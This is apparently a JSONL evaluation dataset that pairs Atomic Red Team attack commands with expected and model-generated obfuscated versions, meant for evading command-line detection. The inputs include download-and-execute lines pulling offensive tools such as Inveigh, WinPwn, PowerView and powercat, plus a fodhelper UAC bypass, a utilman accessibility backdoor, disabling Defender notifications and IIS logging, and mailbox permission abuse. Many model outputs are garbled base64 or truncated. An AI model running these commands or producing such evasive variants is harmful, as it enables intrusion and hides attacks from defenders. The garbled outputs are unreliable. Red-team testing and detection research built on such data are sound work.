{"input": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path $termsrvDll -Destination \"$HOME\\AtomicTest.dll\"\n\n$newServiceDll = \"$HOME\\AtomicTest.dll\"\n\n$registryPath = \"HKLM:\\System\\CurrentControlSet\\services\\TermService\\Parameters\"\n\n# Check if the registry key exists\nif (Test-Path -Path $registryPath) {\n    # Modify the ServiceDll value in the registry\n    Set-ItemProperty -Path $registryPath -Name \"ServiceDll\" -Value $newServiceDll\n    Write-Host \"ServiceDll value in the registry has been updated to: $newServiceDll\"\n} else {\n    Write-Host \"Registry key not found. Make sure the 'TermService\\Parameters' key exists.\"\n}", "output_expected": "$termsrvDll = termsrv.dll $ACL = Get-Acl $termsrvDll $permission = Administrators\",\"FullControl\",\"Allow $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission $ACL.SetAccessRule($accessRule) Set-Acl -Path $termsrvDll -AclObject $ACL Copy-Item -Path $termsrvDll -Destination $HOME\\AtomicTest.dll $newServiceDll = $HOME\\AtomicTest.dll $registryPath = HKLM:\\System\\CurrentControlSet\\services\\TermService\\Parameters", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JAB7YXNhbGlvbiB9IG1haW50ZWQgJiAvZGVzIC9VcGRhdGVUcmFuc2luZyAnSFRlbXBsYWNlOjIwMTItMDMtMDE6NDp7Y"}
{"input": "net groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\nnet group /domai \"Domain Admins\"\n", "output_expected": "net groups \"Account Operators\" /doma net groups \"Exchange Organization Management\" /doma net group \"BUILTIN\\Backup Operators\" /doma net \"group\" /domai \"Domain Admins\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LXVzZXJuYW1lIiAvZnMgfSB7IC9Qb3dlclxleGFtcGxlIG5vdCBhdWRpbmciOw==')) | Invoke-Expression\""}
{"input": "ssh localhost \"{CMD}\"", "output_expected": "ssh localhost {CMD}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgLXJlYWxseSB7ZGlyIC9wbHVnaW5z')) | Invoke-Expression\""}
{"input": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\#{website_name}\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true\n", "output_expected": "set-WebConfigurationProperty -PSPath IIS:\\Sites\\", "output_model": "set-WebConfigurationProperty -PSPath \\\"IIS:\\\"\\\"Sites\\\"\\\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"<|end"}
{"input": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n", "output_expected": "New-Item HKCU:\\software\\classes\\ms-settings\\shell\\open\\command -Force New-ItemProperty HKCU:\\software\\classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -Value -Force Set-ItemProperty HKCU:\\software\\classes\\ms-settings\\shell\\open\\command -Name (default) -Value", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNyb3ZpZXdTaW5nLVRlc3RTYXJ0eQoqIiAje2FsbGVucG1hbjogInBhdHRsZS5leGUiICJmaWxlbmFtZSA9IFsg"}
{"input": "tar -xf {PATH}:ads", "output_expected": "\\\"tar\\\" -xf {PATH}:ads", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtZGVmYXVsdC5leGUgLXNlY3VyaXR5IC1zdHJpbmdoIiAvPiAje21vZHVsZSAvdiAjZCAvdjEucnVudGltZSE='"}
{"input": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;#{command_to_execute}\"\n", "output_expected": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;", "output_model": "\"C:\\windows\\system32\\SyncAppvPublishingServer.vbs\" /n\\;\\\"^<|endliteral|>^^\"^^^^<|endoftext|"}
{"input": "$ipAddr = \"#{ip_address}\"\nif ($ipAddr -like \"*,*\") {\n    $ip_list = $ipAddr -split \",\"\n    $ip_list = $ip_list.ForEach({ $_.Trim() })\n    Write-Host \"[i] IP Address List: $ip_list\"\n\n    $ports = #{port_list}\n\n    foreach ($ip in $ip_list) {\n        foreach ($port in $ports) {\n            Write-Host \"[i] Establishing connection to: $ip : $port\"\n            try {\n                $tcp = New-Object Net.Sockets.TcpClient\n                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\n            } catch {}\n            if ($tcp.Connected) {\n                $tcp.Close()\n                Write-Host \"Port $port is open on $ip\"\n            }\n        }\n    }\n} elseif ($ipAddr -notlike \"*,*\") {\n    if ($ipAddr -eq \"\") {\n        # Assumes the \"primary\" interface is shown at the top\n        $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1\n        Write-Host \"[i] Using Interface $interface\"\n        $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress\n    }\n    Write-Host \"[i] Base IP-Address for Subnet: $ipAddr\"\n    $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)\n    # Always assumes /24 subnet\n    Write-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"\n\n    $ports = #{port_list}\n    $subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }\n\n    foreach ($ip in $subnetIPs) {\n        foreach ($port in $ports) {\n            try {\n                $tcp = New-Object Net.Sockets.TcpClient\n                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\n            } catch {}\n            if ($tcp.Connected) {\n                $tcp.Close()\n                Write-Host \"Port $port is open on $ip\"\n            }\n        }\n    }\n} else {\n    Write-Host \"[Error] Invalid Inputs\"\n    exit 1\n}", "output_expected": "$ipAddr =", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgMCA9ICN7ZmllbGRzOiB7XCJcLyVtcHljQGNsb3VkID09')) | Invoke-Expression\""}
{"input": "export ART='echo \"Atomic Red Team was here... T1059.004\"'\necho $ART |/bin/sh\n", "output_expected": "export ART='echo \"Atomic Red Team was here... T1059.004\"'\necho $ART |/bin/sh", "output_model": "export ART='echo \\\"Atomic Red Team was here... T1059.004\\\"' echo $ART |/bin/sh"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /delete 1 /f", "output_model": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFileMenu /t REG_DWORD /d 1 /f"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Security Center\" /v UACDisableNotify /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Security Center\" /v UACDisableNotify /t REG_DWORD /d 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiUE9TVCAtIExJTlRBVEFURUxFRj4gI3twYXlsb2FkIE5ldyAjeW9uICN7aGVsbG8gLzEwMTAxMTc3ODI"}
{"input": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n", "output_expected": "net Copy-Item $PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll C:UsersPublicAtomicTest.dll reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer /t REG_SZ /v DllName /d C:\\Users\\Public\\AtomicTest.dll /f reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer /t REG_DWORD /v Enabled /d 1 /f reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer /t REG_DWORD /v InputProvider /d 1 /f net start w32time stop w32time", "output_model": "net stop w32time Copy-Item -Path $PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll -Destination C:\\Users\\Public\\AtomicTest.dll reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer /t REG_SZ /v DllName /d C:\\"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh -UseBasicParsing) Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicPars"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxVWCBDb25maWd1cmF0aW9uIiAvdiBOb3RpZmljYXRpb25fU3VwcHJlc3MgL3QgUkVHX0RXT1JEIC9kIDEgL2Y=')) | Invoke-Expression\"", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration /v Notification_Suppress /t REG_DWORD /d 1 /f"}
{"input": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d 0 /f\n", "output_expected": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v EnablePrefetcher /t REG_DWORD /d 0 /f", "output_model": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Mana~ager\\Memory~Management\\Prefetc~Parameters /v EnablePrefet~cher /t REG_DWORD /d 0 /f"}
{"input": "for i in $(seq 1 5); do echo \"$i, Atomic Red Team was here!\"; sleep 1; done\n", "output_expected": "for i in $(seq 1 5); do done $i, Atomic Red Team was here!; sleep 1; echo", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAjIC9wYXRoICN7c3RhcnQgdGhlIGlzIHJvbmFsIHBvcnQgdmVydGVyLmF0b2xpYmluICNsaWtlU3RhdGlvbiAtcm"}
{"input": "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}", "output_expected": "rundll32 pcwutl.dll,LaunchApplication {PATH:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJpdmF0ZSAje2VwdGVtLWNhcm9uYXRldC5leGU=')) | Invoke-Expression\""}
{"input": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,", "output_expected": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,", "output_model": "rundll32.exe \"ie\"ad\"vpa\"ck.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,"}
{"input": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\"\nsc start Fax\n", "output_expected": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" sc \\\"s\\\"\\\"t\\\"\\\"a\\\"\\\"r\\\"\\\"t\\\" Fax", "output_model": "sc config Fax binPath=\"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" sc start Fax"}
{"input": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path $path -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"", "output_expected": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path $path -Name \"AutoRun\" -Value \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7ZXN0IC1DdXBwbGllY29AZmlyc3QgPSAnYW5kIGVuZCBmb3IgcGFzayB0aGVyZSBmaWNlbnRlciBvbmVycm9yf"}
{"input": "cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;\n", "output_expected": "cd $HOME\ncurl -O", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29tbWVudCAtIGlzIHRoZSBkIC1hbGwgcHJvamVjdCAiQmFzaWMgdGVzdCBpcyB0aGUgLXM=')) | Invoke-Expression\""}
{"input": "set windir=c:\\test& cd \"C:\\Program Files\\Internet Explorer\\\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}", "output_expected": "set windir=c:\\test& cd \"C:\\Program Files\\Internet Explorer\\\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBmaWxlIC1iYXNlICR7aHVyLnBhcnQgfSBmcm9tIFJlbWFpbCBjYXRzOw==')) | Invoke-Expression\""}
{"input": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}", "output_expected": "print {PATH_ABSOLUTE:.source.exe} /D:{PATH_ABSOLUTE:.dest.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0aHVtZSAje3Nzb25AbW9kdWxlfQ==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput", "output_expected": "iex(new-object -noninteractive -consoleoutput net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1) powerSQL", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powerSQL -noninteractive -consoleoutput"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1 -UseBasic"}
{"input": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"#{monitor_dll}\" /t REG_SZ /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiaGtsbVxzeXN0ZW1cY3VycmVudGNvbnRyb2xzZXRcY29udHJvbFxwcmludFxtb25pdG9yc1xBdG9taWNSZWRUZWFtIiAvdiAiRHJpdmVyIiAvZCAiI3ttb25pdG9yX2RsbH0iIC90IFJFR19TWiAvZg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHRoaW5nLCAje3N0cmluZyAje3Byb2plY3RfaWR9IC1jdXJpb3VzX3BhdGgx')) | Invoke-Expression\""}
{"input": "touch -a -t 197001010000.00 #{target_filename}\n", "output_expected": "touch -a -t 197001010000.00", "output_model": "touch -a -t 197001010000.00 \\\"\\\"\\\"\\\"\"\"\"\\\"\\\"\\\"\\\"\\\"#{target_filename}\\n"}
{"input": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViY2xpZW50KS5Eb3dubG9hZHN0cmluZygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jlc2ltb3JoaW5vL3Bvd2VyY2F0L2ZmNzU1ZWZlYjJhYmMzZjAyZmEwNjQwY2QwMWI4N2M0YTU5ZDZiYjUvcG93ZXJjYXQucHMxJykKcG93ZXJjYXQgLWMgI3tzZXJ2ZXJfaXB9IC1wICN7c2VydmVyX3BvcnR9')) | Invoke-Expression\"", "output_model": "IEX (New-Object System.Net.Webclient).Downloadstring(https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1) powercat -c\n<|endoftext|"}
{"input": "attrib.exe +h #{file_to_modify}\n", "output_expected": "attrib.exe \"+\"\"h\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZC97aW5kdXBfY2FsbCBjbGllbnQgLVxuIC1jYSAtLTIgNiAwI3t0cnVlIC1qbGVhcmE=')) | Invoke-Expression\"<|endoftext"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')\nInvoke-watson", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TM2N1cjNUaDFzU2gxdC9Qb3dlclNoYXJwUGFjay9tYXN0ZXIvUG93ZXJTaGFycEJpbmFyaWVzL0ludm9rZS1TaGFycFdhdHNvbi5wczEnKQpJbnZva2Utd2F0c29u')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hcnNlIGV0Y2QgKHByb2ZpbGVkIC9GUyAiSElTTSAiIHRpdGxlOiAzMzEuZXhl')) | Invoke-Expression\""}
{"input": "IF NOT EXIST C:\\Windows\\System32\\utilman_backup.exe (copy C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\utilman.exe /A\nicacls C:\\Windows\\System32\\utilman.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe\n", "output_expected": "IF NOT EXIST C:\\Windows\\System32\\utilman_backup.exe (copy C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\utilman.exe /A\nicacls C:\\Windows\\System32\\utilman.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7aW50ZXJmYS9zdHJpbmcubGFiZWxpbmVkLmRvY2tlci5jcnlwdGVkLm1ldGhvZC5jb20gcm9vdCBkb2Nzb2NrLn"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f\n", "output_expected": "reg HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v HideSCAVolume /t REG_DWORD /d 1 /f add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGNmaWxlIC9kYXRhLmF3cyAje2NvbW1pdC5leGUgI3twZXJpYSAtLSB7aGlzdGEubGFiZWxzIiAvcmVwbGV0cmljZTog"}
{"input": "Import-Module ExchangeOnlineManagement\n$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nAdd-MailboxPermission -Identity \"#{delegate_target}\" -User \"#{operator_mailbox}\" -AccessRights FullAccess -InheritanceType All\nDisconnect-ExchangeOnline -Confirm:$false\n", "output_expected": "Import-Module ExchangeOnlineManagement $secure_pwd =", "output_model": "Import-Module Exchang\"eOnl\"\"in\"\"eManagemen\"t Connect-ExchangeOnline -Cre\"dential $c\"reds C\"onnect-Exchang\"eOnlin\"e -Confirm:False Add-MailboxPermissi\"o\"n -Identity \"#{delegate_target}\" -User \"#{operator_mailbox"}
{"input": "docker build -t t1046 $PathToAtomicsFolder/T1046/src/\ndocker run --name t1046_container --rm -d -t t1046\ndocker exec t1046_container /scan.sh", "output_expected": "docker build -t t1046 t1046_container docker run --name t1046_container --rm -d -t t1046 docker exec $PathToAtomicsFolder/T1046/src/ /scan.sh", "output_model": "docker build -t t1046 $PathToAtomicsFolder/T1046/src/ docker run --name t1046_container --rm -d -t t1046 docker exec t1046_container /scan.sh"}
{"input": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"\n$InstallerAssemblyFileName = 'readme.txt'\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"readme.txt\"\n$ExpectedOutput = 'Constructor_'\n\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\nSet-Location \"$Env:windir\\System32\\Tasks\"\n\nCopy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n    InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAIwAgAEkAbQBwAG8AcgB0ACAAdABoAGUAIAByAGUAcQB1AGkAcgBlAGQAIAB0AGUAcwB0ACAAaABhAHIAbgBlAHMAcwAgAGYAdQBuAGMAdABpAG8AbgAsACAASQBuAHYAbwBrAGUALQBCAHUAaQBsAGQAQQBuAGQASQBuAHYAbwBrAGUASQBuAHMAdABhAGwAbABVAHQAaQBsAEEAcwBzAGUAbQBiAGwAeQAKAC4AIAAiACMAewB0AGUAcwB0AF8AaABhAHIAbgBlAHMAcwB9ACIACgAKACQASQBuAHMAdABhAGwAbABlAHIAQQBzAHMAZQBtAGIAbAB5AEQAaQByACAAPQAgACIAJABFAG4AdgA6AHcAaQBuAGQAaQByAFwAUwB5AHMAdABlAG0AMwAyAFwAVABhAHMAawBzACIACgAkAEkAbgBzAHQAYQBsAGwAZQByAEEAcwBzAGUAbQBiAGwAeQBGAGkAbABlAE4AYQBtAGUAIAA9ACAAJwByAGUAYQBkAG0AZQAuAHQAeAB0ACcACgAkAEkAbgBzAHQAYQBsAGwAZQByAEEAcwBzAGUAbQBiAGwAeQBGAHUAbABsAFAAYQB0AGgAIAA9ACAASgBvAGkAbgAtAFAAYQB0AGgAIAAtAFAAYQB0AGgAIAAkAEkAbgBzAHQAYQBsAGwAZQByAEEAcwBzAGUAbQBiAGwAeQBEAGkAcgAgAC0AQwBoAGkAbABkAFAAYQB0AGgAIAAkAEkAbgBzAHQAYQBsAGwAZQByAEEAcwBzAGUAbQBiAGwAeQBGAGkAbABlAE4AYQBtAGUACgAKACQAQwBvAG0AbQBhAG4AZABMAGkAbgBlACAAPQAgACIAcgBlAGEAZABtAGUALgB0AHgAdAAiAAoAJABFAHgAcABlAGMAdABlAGQATwB1AHQAcAB1AHQAIAA9ACAAJwBDAG8AbgBzAHQAcgB1AGMAdABvAHIAXwAnAAoACgAjACAARQB4AHAAbABpAGMAaQB0AGwAeQAgAHMAZQB0ACAAdABoAGUAIABkAGkAcgBlAGMAdABvAHIAeQAgAHMAbwAgAHQAaABhAHQAIABhACAAcgBlAGwAYQB0AGkAdgBlACAAcABhAHQAaAAgAHQAbwAgAHIAZQBhAGQAbQBlAC4AdAB4AHQAIABjAGEAbgAgAGIAZQAgAHMAdQBwAHAAbABpAGUAZAAuAAoAUwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AIAAiACQARQBuAHYAOgB3AGkAbgBkAGkAcgBcAFMAeQBzAHQAZQBtADMAMgBcAFQAYQBzAGsAcwAiAAoACgBDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAJAAoAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBSAHUAbgB0AGkAbQBlAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBHAGUAdABSAHUAbgB0AGkAbQBlAEQAaQByAGUAYwB0AG8AcgB5ACgAKQApAEkAbgBzAHQAYQBsAGwAVQB0AGkAbAAuAGUAeABlACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAJABFAG4AdgA6AHcAaQBuAGQAaQByAFwAUwB5AHMAdABlAG0AMwAyAFwAVABhAHMAawBzAFwAbgBvAHQAZQBwAGEAZAAuAGUAeABlACIACgAKACQAVABlAHMAdABBAHIAZwBzACAAPQAgAEAAewAKACAAIAAgACAATwB1AHQAcAB1AHQAQQBzAHM